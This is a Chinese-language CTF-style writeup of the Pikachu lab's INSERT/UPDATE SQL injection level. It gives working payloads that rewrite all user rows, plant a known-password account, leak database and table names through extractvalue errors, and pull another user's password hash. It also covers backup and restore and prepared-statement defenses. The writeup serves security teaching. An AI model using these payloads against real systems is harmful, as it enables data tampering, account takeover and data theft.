---
layout: post
title: Pikachu - SQL注入 insert/update注入 Writeup（写操作注入与报错注入）
platform: pikachu
date: 2026-10-28 22:14:00 +0800
categories: CTF
---

Pikachu - SQL注入 insert/update注入 Writeup（写操作注入与报错注入）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：SQL-Inject → "insert/update"注入
- 入口：`http://localhost/pikachu/vul/sqli/sqli_iu/sqli_login.php`
- 题型：Web
- 考点：**写操作注入（INSERT / UPDATE）**、**报错注入**、字段长度限制

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
数据库：pikachu / root / root
```

**这一关有 4 个页面**：

```
sqli_login.php   登录（GET）      → ★ 用了 escape()，有防护
sqli_reg.php     注册（POST）     → ★ escape() 被注释掉了 → INSERT 注入
sqli_edit.php    修改资料（POST）  → ★ 无 escape() → UPDATE 注入
sqli_mem.php     会员中心
```

**作者提示**：

| 页面 | 提示 |
|---|---|
| 登录页 | `请先自己注册一个账号` |
| 修改页 | `没啥好提示的,自己看着办` |

**作者在源码注释里直接说明了漏洞**：

```php
// sqli_reg.php 第 29 行
//没转义,导致注入漏洞,操作类型为insert
$getdata = $_POST;

// sqli_edit.php 第 35 行
//未转义,形成注入,sql操作类型为update
$getdata = $_POST;
```

**✅ 实测结果（四种打法全部验证）**

| # | 场景 | payload 位置 | payload | 结果 |
|---|---|---|---|---|
| 1 | **UPDATE 批量改** | 住址 `add` | `x' where 1=1 #` | **7 个用户数据全被改** ✅ |
| 2 | **INSERT 插账号** | 住址 `add` | `x'),('hacker01',md5('hack123'),'boy','1','h@h.com','pwned')#` | **插入成功，能登录** ✅ |
| 3 | **UPDATE 报错读** | 住址 `add` | `x', address=(select extractvalue(1,concat(0x7e,database()))) #` | **`~pikachu`** ✅ |
| 4 | **INSERT 报错读** | 住址 `add` | `x' or extractvalue(1,concat(0x7e,database())) or '` | **`~pikachu`** ✅ |

**payload 3 的更多输出**：

```text
database()     → XPATH syntax error: '~pikachu'
version()      → XPATH syntax error: '~5.7.26'
表名（group_concat）→ XPATH syntax error: '~httpinfo,member,message,users,x'
                                          └──── 被 32 字符截断
```

二、题目分析

**① 登录页有防护，注册/修改页没有**

**登录（`sqli_login.php` 第 32-34 行）**：

```php
$username = escape($link, $_GET['username']);      // ★ 有转义
$password = escape($link, $_GET['password']);
$query = "select * from member where username='$username' and pw=md5('$password')";
```

**★ 所以登录页打不了（这是作者的"对照组"）。**

**注册（`sqli_reg.php` 第 27-31 行）**：

```php
//      $getdata=escape($link, $_POST);//转义        ← ★ 被注释掉了！
$getdata = $_POST;                                   // ★ 原样用

$query = "insert into member(username,pw,sex,phonenum,email,address)
          values('{$getdata['username']}',
                 md5('{$getdata['password']}'),
                 '{$getdata['sex']}',
                 '{$getdata['phonenum']}',
                 '{$getdata['email']}',
                 '{$getdata['add']}')";
```

**修改（`sqli_edit.php` 第 33-37 行）**：

```php
//        $getdata=escape($link, $_POST);            ← ★ 被注释掉了！
$getdata = $_POST;

$query = "update member set
              sex='{$getdata['sex']}',
              phonenum='{$getdata['phonenum']}',
              address='{$getdata['add']}',
              email='{$getdata['email']}'
          where username='{$_SESSION['sqli']['username']}'";
```

**★ 三个关键点**：

```
① 两个写操作页面都【没有转义】
② 每个字段都被 '...' 包裹 → 需要闭合引号
③ WHERE 用的是 session 里的用户名（不是用户输入）→ 只能"改自己"
   ★ 但注入后可以用 or 1=1 突破这个限制
```

**② ⚠️ 和前面几关最大的不同：没有回显**

**前面几关**：

```sql
select id,email from member where username='$name'
        └──────┬──────┘
      SELECT 的结果会显示在页面上
      → 能直接 union，把数据"回显"出来
```

**本关**：

```sql
insert into member(...) values(...)      -- 不返回数据
update member set ... where ...          -- 不返回数据

★ 页面上只有"注册成功"/"修改成功"这种提示
★ UNION 注入在这里【用不了】—— 因为没有"回显位"
```

**★ 那怎么读数据？**

```
答案：报错注入（Error-Based Injection）
    · 让 SQL 产生一个错误
    · 错误信息里带上你要的数据
    · 而 execute() 会把 MySQL 的错误信息直接输出来
```

**③ 报错注入的原理（本关的核心技术）**

**看 `execute()` 的实现**：

```php
// inc/mysql.inc.php
function execute($link, $query){
    $result = mysqli_query($link, $query);
    if(mysqli_errno($link)){
        exit(mysqli_error($link));       // ★ 直接输出 MySQL 错误信息并终止
    }
    return $result;
}
```

**★ 这就是"报错注入"的前提**：错误信息会显示在页面上。

**MySQL 的两个"报错函数"**：

```sql
extractvalue(XML_document, XPath_string)     -- 从 XML 里提取值
updatexml(XML_document, XPath_string, new_value)  -- 更新 XML 的值
```

**★ 为什么它们能"读数据"？**

```
这两个函数会校验第 2 个参数是不是合法的 XPath 表达式
如果不合法 → 报错 → 错误信息里【包含那个非法的 XPath 字符串】

所以：
    你传入 concat(0x7e, database())
    → 拼接成 "~pikachu"
    → "~pikachu" 不是合法 XPath
    → MySQL 报错：XPATH syntax error: '~pikachu'
    → ★ 数据库名就出现在错误信息里了
```

**★ `0x7e` 是什么？**

```
0x7e 是十六进制的 0x7E = ASCII 的 "~"（波浪号）

用它的原因：
    ① 加个前缀，方便在错误信息里定位数据
    ② "~" 不是合法的 XPath 起始字符 → 必定报错
```

**④ 字段长度限制（本关的第一个坑）**

**看表结构**：

```sql
CREATE TABLE `member` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(66) NOT NULL,
  `pw` varchar(128) NOT NULL,
  `sex` char(10) NOT NULL,              -- ★ 只有 10 个字符！
  `phonenum` varchar(255) NOT NULL,
  `address` varchar(255) NOT NULL,      -- ★ 255，最好用
  `email` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM
```

**★ 所以**：

```
sex      → char(10)      → payload 放这里会被截断成 10 字符 → 打不了
phonenum → varchar(255)  → 可以用
address  → varchar(255)  → ★ 最长，推荐
email    → varchar(255)  → 可以用
```

**★ 这是一个很容易踩的坑**：

```
如果你把 payload 放在"性别"字段
→ 被截断到 10 个字符
→ SQL 语法错误或注入失败
→ 你会以为"这关没注入"
```

**⑤ 必须闭合引号（第二个坑）**

**错误尝试**：

```
（性别/住址栏填）(select extractvalue(1,database()))
```

**★ 结果**：没有报错，`address` 字段被存成了这串**字面量字符串**：

```sql
update member set ... address='(select extractvalue(1,database()))', ...
                          └──────────────────────────────────────┘
                           因为外面有单引号包着 → 整个是字符串字面量
                           ★ 子查询根本没被求值
```

**★ 正确写法必须先闭合引号**：

```
x', address=(select extractvalue(1,concat(0x7e,database()))) #
   └┬┘└────────────────────┬──────────────────────────────┘└┬┘
 闭合并加新赋值              子查询（现在在引号外了）        注释掉余下部分
```

**★ 拼出来的 SQL**：

```sql
update member set sex='boy',phonenum='1',
    address='x', address=(select extractvalue(1,concat(0x7e,database())))
    #',email='a@b.com' where username='test01'
```

**★ 注意**：`SET a='x', a=(...)` 里重复赋值是合法的（MySQL 取最后一个），所以这招可行。

**⑥ 报错信息在页面"中间"（第三个坑）**

**看执行顺序**：

```php
// sqli_edit.php
include_once header.php;        // ① 先输出导航栏 HTML（约 30KB）
$link = connect();
... $query = "update ...";
execute($link, $query);         // ② 报错在这里 exit() → 输出在导航栏之后
?>
<div class="main-content">      // ③ 这部分根本没执行
```

**★ 所以**：

```
页面结构：
    <html>...导航栏...</html>（30KB）
    XPATH syntax error: '~pikachu'      ← ★ 报错在这
    （然后页面就结束了）

★ 调试时别只看页面"末尾"
★ 要搜索关键字：XPATH / You have an error / SQL syntax
```

三、解题步骤

**第 0 步：先备份数据（重要）**

**★ 因为 `where 1=1` 那招会把所有用户数据改掉，不恢复会影响后面做 CSRF 等模块。**

```powershell
D:\phpstudy_pro\Extensions\MySQL5.7.26\bin\mysql.exe `
  --host=127.0.0.1 --user=root --password=root --default-character-set=utf8mb4 `
  -e "use pikachu; select * from member;" > member_backup.txt
```

**第 1 步：注册一个正常账号**

```text
① 打开 http://localhost/pikachu/vul/sqli/sqli_iu/sqli_reg.php
② 填写：
     用户: test01
     密码: abc123
     性别: boy
     手机: 111
     邮箱: t@t.com
     住址: here
③ 点 submit
④ 看到："注册成功,请返回登录"
```

**★ 这一步很重要**：先有一个自己的账号，才能登录去做 UPDATE 注入。

**第 2 步：登录**

```text
http://localhost/pikachu/vul/sqli/sqli_iu/sqli_login.php
test01 / abc123
```

**★ 登录后进入 `sqli_mem.php`（会员中心）。**

**第 3 步：⭐ 打法 1 —— UPDATE 批量改数据（最震撼）**

```text
① 点"修改个人信息" → 进入 sqli_edit.php
② 在【住址】栏填：
      x' where 1=1 #
③ 点 submit
```

**★ 拼出来的 SQL**：

```sql
update member set sex='boy',phonenum='111',
    address='x' where 1=1 #',email='t@t.com' where username='test01'
                       └──┬──┘
                  注释掉后面所有限制条件
```

**★ 实测结果**（查数据库）：

```text
id  username  sex   phonenum  address
1   vince     pwn   999       x
2   allen     pwn   999       x
3   kobe      pwn   999       x
4   grady     pwn   999       x
5   kevin     pwn   999       x
6   lucy      pwn   999       x
7   lili      pwn   999       x

★ 7 个用户的资料全部被改写
```

**★ 为什么危害大**：

```
原本：where username='test01'  → 只能改自己
注入后：where 1=1             → 改所有人

★ 一个普通注册用户，能篡改全站用户的数据
★ 这就是"越权"（水平越权）
```

**第 4 步：⭐ 打法 2 —— INSERT 插入任意账号**

```text
① 回注册页 sqli_reg.php
② 用户、密码随便填（会被截断掉）
③ 在【住址】栏填：
      x'),('hacker01',md5('hack123'),'boy','1','h@h.com','pwned')#
④ 点 submit
```

**★ 拼出来的 SQL**：

```sql
insert into member(username,pw,sex,phonenum,email,address) values
('u2',md5('p2'),'boy','2','u2@t.com','x'),
('hacker01',md5('hack123'),'boy','1','h@h.com','pwned')
                    └────────────────┬────────────────┘
                     ★ 多插入的这一行（我完全控制）
```

**★ 实测结果**：

```text
id 25 | test01   | （正常注册的）
id 26 | u2       | ★ 被注入截断
id 27 | hacker01 | ★ 注入插入的行
```

**★ 然后去登录页试**：

```
hacker01 / hack123   → 登录成功 ✅
```

**★ 注意**：`member` 表 **没有 username 唯一索引**（只有 id 是主键）：

```sql
PRIMARY KEY (`id`)          -- 只有这一个索引
```

**★ 所以可以插入重名用户 —— 这会带来一个有趣的副作用**：

```
登录代码要求：mysqli_num_rows($result) == 1
    如果插入一行 username='vince' 的记录
    → vince 登录时会匹配到 2 行
    → num_rows == 2 != 1
    → ★ 原用户反而登录不了（被 DoS）
```

**第 5 步：⭐ 打法 3 —— UPDATE 报错注入读数据**

```text
① 保持登录状态
② 进 sqli_edit.php
③ 在【住址】栏填：
      x', address=(select extractvalue(1,concat(0x7e,database()))) #
④ 点 submit
```

**★ 实测输出**（在页面中间）：

```
XPATH syntax error: '~pikachu'
```

**★ 换其他 payload**：

```sql
-- 版本
x', address=(select extractvalue(1,concat(0x7e,version()))) #
→ XPATH syntax error: '~5.7.26'

-- 表名
x', address=(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))) #
→ XPATH syntax error: '~httpinfo,member,message,users,x'
                                └──── 被截断到 32 字符

-- 读长数据要用 substr 分段
x', address=(select extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,20)))) #
→ 读第 1-20 字符：'~httpinfo,member,mes'

x', address=(select extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),21,20)))) #
→ 读第 21-40 字符：'~sage,users,xssblind'
```

**★ 拼接两段就能拿到完整数据**。

**第 6 步：⭐ 打法 4 —— INSERT 报错注入读数据**

```text
① 回注册页 sqli_reg.php
② 在【住址】栏填：
      x' or extractvalue(1,concat(0x7e,database())) or '
③ 点 submit
```

**★ 实测输出**：

```
XPATH syntax error: '~pikachu'
```

**★ 为什么这个 payload 结构是 `x' or ... or '`？**

```sql
values('u9',md5('p9'),'boy','9','u9@t.com','x' or extractvalue(...) or '')
                                              └──────────┬──────────────┘
                                            这整个是"一个表达式"
                                            会被求值 → 触发报错
```

**第 7 步：恢复数据（重要）**

**★ 测完之后一定要恢复**，否则后面 CSRF 那几关会数据错乱。

```powershell
# 删除测试账号
D:\phpstudy_pro\Extensions\MySQL5.7.26\bin\mysql.exe --host=127.0.0.1 --user=root --password=root `
  -e "use pikachu; DELETE FROM member WHERE id > 7;"

# 恢复 7 个用户的数据
D:\phpstudy_pro\Extensions\MySQL5.7.26\bin\mysql.exe --host=127.0.0.1 --user=root --password=root --default-character-set=utf8mb4 `
  -e "use pikachu;
      UPDATE member SET sex='boy',  phonenum='18626545453', address='chain',                  email='vince@pikachu.com' WHERE username='vince';
      UPDATE member SET sex='boy',  phonenum='13676767767', address='nba 76',                 email='allen@pikachu.com' WHERE username='allen';
      UPDATE member SET sex='boy',  phonenum='15988767673', address='nba lakes',              email='kobe@pikachu.com'  WHERE username='kobe';
      UPDATE member SET sex='boy',  phonenum='13676765545', address='nba hs',                 email='grady@pikachu.com' WHERE username='grady';
      UPDATE member SET sex='boy',  phonenum='13677676754', address='Oklahoma City Thunder',  email='kevin@pikachu.com' WHERE username='kevin';
      UPDATE member SET sex='girl', phonenum='12345678922', address='usa',                    email='lucy@pikachu.com'  WHERE username='lucy';
      UPDATE member SET sex='girl', phonenum='18656565545', address='usa',                    email='lili@pikachu.com'  WHERE username='lili';"
```

**★ 验证**：

```sql
select id,username,sex,phonenum,address,email from member order by id;
```

**第 8 步：完整 payload 汇总**

```sql
-- ========== INSERT 注入（注册页）==========

-- 插多行（插一个已知密码的账号）
x'),('hacker01',md5('hack123'),'boy','1','h@h.com','pwned')#

-- 报错读数据
x' or extractvalue(1,concat(0x7e,database())) or '

-- ========== UPDATE 注入（修改资料页）==========

-- 批量改所有人
x' where 1=1 #

-- 报错读数据
x', address=(select extractvalue(1,concat(0x7e,database()))) #
x', address=(select extractvalue(1,concat(0x7e,version()))) #
x', address=(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))) #

-- 改指定用户的数据（覆盖别人的密码）
x', email=(select pw from (select pw from member where username='vince')a) #
```

四、延伸知识

**① 报错注入的两个函数与长度限制**

**`extractvalue()`**：

```sql
extractvalue(XML_document, XPath_string)
-- 第 2 个参数不是合法 XPath → 报错，错误信息带参数值
```

**`updatexml()`**：

```sql
updatexml(XML_document, XPath_string, new_value)
-- 同上，第 2 个参数不合法也会报错
```

**★ 两个函数的共同限制**：

```
报错信息最多显示 32 个字符
→ 读长数据要用 substr() 分段
```

**★ 分段读的模板**：

```sql
-- 第 1-20 字符
extractvalue(1, concat(0x7e, substr((SELECT ...), 1, 20)))

-- 第 21-40 字符
extractvalue(1, concat(0x7e, substr((SELECT ...), 21, 20)))
```

**★ 用 length() 先知道总长度**：

```sql
extractvalue(1, concat(0x7e, length((select group_concat(username) from users))))
→ '~18'   说明总长 18 字符 → 分 1 段就够
```

**② INSERT 注入的三种利用方式**

**方式 1：插入多行（本关实测）**

```sql
insert into t(a,b,c) values('A','B','C'),('X','Y','Z')
```

**payload**：

```
x'),('我自己想要的', '值', '值')#
```

**★ 用途**：

```
· 插入一个已知密码的账号
· 插入大量垃圾数据（DoS）
· 插入一条"看起来是管理员"的记录
```

**方式 2：`INSERT ... SELECT`（读数据）**

```sql
insert into t(a,b,c) select ... from other_table
```

**★ payload 需要闭合 VALUES 部分**（难度较高）：

```
x') select ... from information_schema.columns #
```

**★ 但这个方式"没回显"**，还是得靠报错注入或盲注。

**方式 3：`ON DUPLICATE KEY UPDATE`（覆盖已有数据）**

**★ 前提**：表上有唯一索引。

```sql
insert into t(id, username, pw) values(1,'vince','新密码')
on duplicate key update pw=values(pw)
```

**★ 本关的 `member` 表没有唯一索引（只有 id 主键）→ 这招用不了。**

**★ 但如果换成 `users` 表（有 id 主键）**：

```
1'),('1', 'admin', md5('hack')) on duplicate key update pw=md5('hack')#
```

**★ 不过这也只是"插 id=1 的新行"，主键冲突才触发 update。**

**③ UPDATE 注入的三种利用方式**

**方式 1：`where 1=1` 批量改（本关实测）**

```sql
update member set sex='x' where 1=1
```

**★ 危害**：篡改所有用户数据。

**方式 2：子查询读数据（本关实测）**

```sql
update member set address=(select extractvalue(...))
```

**方式 3：改别人的密码（越权）**

```sql
-- 把 vince 的密码改成我已知的
x', email=(select pw from (select pw from member where username='vince')a) #
```

**★ 更直接的做法**：

```sql
-- 用子查询改指定用户
x' where 1=1; update ... #      ← 需要堆叠注入（本关不支持）
```

**★ 或者**：

```sql
-- 让 address 变成"别人的密码"
x', address=(select pw from member where username='vince') #
```

**★ 这能把别人的密码哈希搬到自己的资料里 → 再拿去破解。**

**④ 写操作注入 vs 读操作注入（危害对比）**

| | 读操作注入（SELECT） | **写操作注入（INSERT/UPDATE/DELETE）** |
|---|---|---|
| 典型位置 | 搜索框、详情页 | **注册、修改资料、删除** |
| 能读数据吗 | ✅ 直接 UNION | ⚠️ 只能报错/盲注 |
| 能改数据吗 | ❌ 不能 | ✅ **能** |
| 直接危害 | 数据泄露 | **数据篡改 / 越权 / 植入账号** |
| 隐蔽性 | 较低（能读到明显异常）| **较高（页面提示"修改成功"，看不出被篡改）** |

**★ 一个重要的认知**：

```
很多人只盯着"能不能读到数据"
但写操作注入的危害往往更大：

    · 改掉别人的密码 → 接管账号
    · 插入管理员账号 → 提权
    · 批量篡改订单/金额 → 直接经济损失
    · 删除数据 → 业务瘫痪

★ 而且写操作"没有回显"，往往更难发现
```

**⑤ DELETE 注入（下一关预告）**

**典型的 DELETE 语句**：

```php
$query = "delete from table where id=$id";
```

**★ 危害比 UPDATE 更严重**：

```sql
delete from member where id=1 or 1=1      -- ★ 删光整张表
```

**★ 或者用子查询**：

```sql
delete from member where id=(select ...)  -- 有选择的删除
```

**★ 注意**：

```
DELETE 一旦执行，数据就没了
→ 测试时要格外小心（先备份）
→ 或者用 "and 1=2" 让它"不删任何东西"来确认注入点存在
```

**⑥ 防御：预处理是关键**

**❌ 本关的做法（注释掉转义）**：

```php
//  $getdata = escape($link, $_POST);    // 注释掉了
$getdata = $_POST;
```

**⚠️ 即使不注释掉 `escape()`，也只是"次优解"**：

```
escape() 能防住引号闭合
但不能防住"宽字节"（下一关）
也不能防住"数字型"（因为数字型不需要引号）
```

**✅ 正确做法：预处理语句**

**INSERT 的预处理**：

```php
$stmt = $link->prepare(
    "insert into member(username, pw, sex, phonenum, email, address)
     values (?, ?, ?, ?, ?, ?)"
);
$stmt->bind_param('ssssss',
    $_POST['username'],
    md5($_POST['password']),      // ★ 密码在 PHP 侧算，不拼进 SQL
    $_POST['sex'],
    $_POST['phonenum'],
    $_POST['email'],
    $_POST['add']
);
$stmt->execute();
```

**★ 注意 `md5()` 的处理**：

```php
-- 本关的错误做法：把 md5() 写进 SQL
values('{$password}', md5('{$getdata['password']}'))

-- 正确做法：在 PHP 里算好再绑
$hash = md5($_POST['password']);
$stmt->bind_param('ss', $username, $hash);
```

**UPDATE 的预处理**：

```php
$stmt = $link->prepare(
    "update member set sex=?, phonenum=?, address=?, email=? where username=?"
);
$stmt->bind_param('sssss',
    $_POST['sex'], $_POST['phonenum'], $_POST['add'], $_POST['email'],
    $_SESSION['sqli']['username']
);
$stmt->execute();
```

**★ 预处理的本质**：

```
SQL 结构（含 ? 占位符）先编译
参数值后绑定
→ 值永远不会被当"语句"解析
→ 无论用户输入什么，都只是"一个数据"
```

**⑦ 一个实用的测试习惯：先"不删不改"地确认注入**

**做写操作注入时，先确认注入点，再"真改"**：

```sql
-- 确认 UPDATE 注入存在，但不改任何数据
x' and 1=2 #

-- 如果页面显示"修改失败"或 update 影响 0 行
-- → 说明注入生效了（条件为假）
```

**★ 或者用 `and 1=2` 配合报错**：

```sql
x' and extractvalue(1,concat(0x7e,database())) and '1'='2
```

**★ 这样报错会触发，但数据不会被改。**

**★ DELETE 场景尤其要这样**：

```sql
-- ❌ 千万别这么测
delete from t where id=1 or 1=1        -- 数据没了

-- ✅ 这么测
delete from t where id=1 and 1=2       -- 影响 0 行，安全
```

五、总结

- **本题核心：注册（INSERT）和修改资料（UPDATE）两处没有转义 → 写操作注入。**

- **两行漏洞代码**：

```php
// sqli_reg.php
$query = "insert into member(...) values('{username}',md5('{password}'),'{sex}','{phonenum}','{email}','{add}')";

// sqli_edit.php
$query = "update member set sex='{sex}',phonenum='{phonenum}',address='{add}',email='{email}' where username='{SESSION}'";
```

- **⭐ 六个必记要点**：

```text
① 写操作注入没有回显
   INSERT / UPDATE 不返回数据 → UNION 用不了
   → 读数据要靠"报错注入"（extractvalue / updatexml）

② 报错注入的前提
   错误信息会显示在页面上（execute() 里 exit(mysqli_error())）
   → 这是"信息泄露"+"注入"的组合

③ 字段长度是隐形限制
   sex char(10) → payload 放这会被截断
   要用 address / email / phonenum（varchar 255）

④ 必须闭合引号
   直接写 (select ...) 会被当成字符串字面量
   要先 x', address=(select ...) #

⑤ 报错信息在页面"中间"
   因为 header.php 先输出了导航栏
   调试要搜 XPATH 关键字，别只看末尾

⑥ extractvalue 只显示 32 字符
   长数据用 substr() 分段读
```

- **实测数据**：

```text
【UPDATE 批量改】
    x' where 1=1 #
    → 7 个用户的 sex/phonenum/address 全被改成 pwn/999/x

【INSERT 插账号】
    x'),('hacker01',md5('hack123'),'boy','1','h@h.com','pwned')#
    → 插入了 hacker01，密码 hack123
    → 用 hacker01 / hack123 登录成功

【UPDATE 报错读】
    x', address=(select extractvalue(1,concat(0x7e,database()))) #
    → XPATH syntax error: '~pikachu'
    → version()  → '~5.7.26'
    → 表名        → '~httpinfo,member,message,users,x'（32 字符截断）

【INSERT 报错读】
    x' or extractvalue(1,concat(0x7e,database())) or '
    → XPATH syntax error: '~pikachu'
```

- **SQL-Inject 模块进度**：

```text
✅ 数字型注入(post)      —— 无符号，直接塞条件
✅ 字符型注入(get)       —— 闭合 '
✅ 搜索型注入            —— 闭合 '%（+ 组合 XSS）
✅ xx型注入              —— 闭合 ')（+ 括号）
✅ "insert/update"注入   —— 本题：写操作 + 报错注入
⬜ "delete"注入          —— 删除操作注入
⬜ "http header"注入     —— User-Agent / Referer
⬜ 盲注(base on boolean) —— 只有真假两种状态
⬜ 盲注(base on time)    —— 用 sleep 判断
⬜ 宽字节注入            —— GBK 编码绕过 addslashes
```

**手工复现要点**：

```text
· 先注册 test01 / abc123（提示要求）
· 登录 → 进修改资料页
· 住址填 x' where 1=1 # → 查到 7 个用户全被改
· 住址填 x', address=(select extractvalue(1,concat(0x7e,database()))) # → 看 '~pikachu'
· 回注册页，住址填 x'),('hacker01',md5('hack123'),...) # → 插入账号
· 用 hacker01/hack123 登录 → 成功
· ★ 测完恢复 member 表（DELETE id>7 + UPDATE 原数据）
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  写操作注入 = 没有回显的注入                                   │
│                                                            │
│  两条路：                                                   │
│     ① 改数据：where 1=1 → 批量篡改                            │
│     ② 读数据：报错注入 → extractvalue 把数据塞进错误信息        │
│                                                            │
│  ★ 字段长度会截断 payload（sex 只有 10 字符）                  │
│  ★ 必须先闭合引号                                            │
│  ★ extractvalue 只显示 32 字符 → 用 substr 分段                │
│  ★ 测完要恢复数据（写操作是"真改"）                             │
│                                                            │
│  防御：预处理语句（prepare + bind_param）                      │
└────────────────────────────────────────────────────────────┘
```
